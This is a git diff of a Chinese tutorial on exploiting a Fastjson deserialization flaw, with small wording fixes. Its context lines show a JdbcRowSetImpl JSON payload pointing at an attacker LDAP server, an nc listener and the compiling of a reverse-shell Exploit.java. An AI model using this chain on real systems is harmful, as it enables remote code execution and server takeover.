@@ -13,6 +13,8 @@ javac 1.8.0_222
 ### 0x00 假设存在漏洞的功能
 
 ```
+# param参数内容被fastjson调用解析
+
 POST /note/submit/
 
 param={'id':29384,'content':'Hello','type':'string'}
@@ -29,7 +31,7 @@ nc -lvvp 7777
 ```
 POST /note/submit/
 
-param={"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ip:7777/Exploit","autoCommit":true}}}
+param={"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://IP:7777/Exploit","autoCommit":true}}}
 ```
 
 如果监听服务器有流量，可以继续下一步
@@ -52,7 +54,7 @@ python3 -m http.server 80 或者 python -m SimpleHTTPServer 80
 
 修改Exploit.java中的反弹IP和端口（准备接收反弹SHELL的服务器IP和监听端口）
 
-使用javac编译Exploit.java，生成Exploit.class文件（注意：javac最好与目标服务器接近，否则目标服务器无法解析class文件，会报错）
+使用javac编译Exploit.java，生成Exploit.class文件（注意：javac版本最好与目标服务器接近，否则目标服务器无法解析class文件，会报错）
 ```
 javac Exploit.java
 ```
@@ -91,7 +93,7 @@ param={"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
 
 ### 0x05 问题
 
-当javac版本和目标服务器差太多，会报一个这样得到错误，所以需要使用1.8的javac来编译Exploit.java
+当javac版本和目标服务器差太多，会报一个下面那样的错误，所以需要使用1.8的javac来编译Exploit.java
 ```
 Caused by: java.lang.UnsupportedClassVersionError: Exploit has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0
 ```
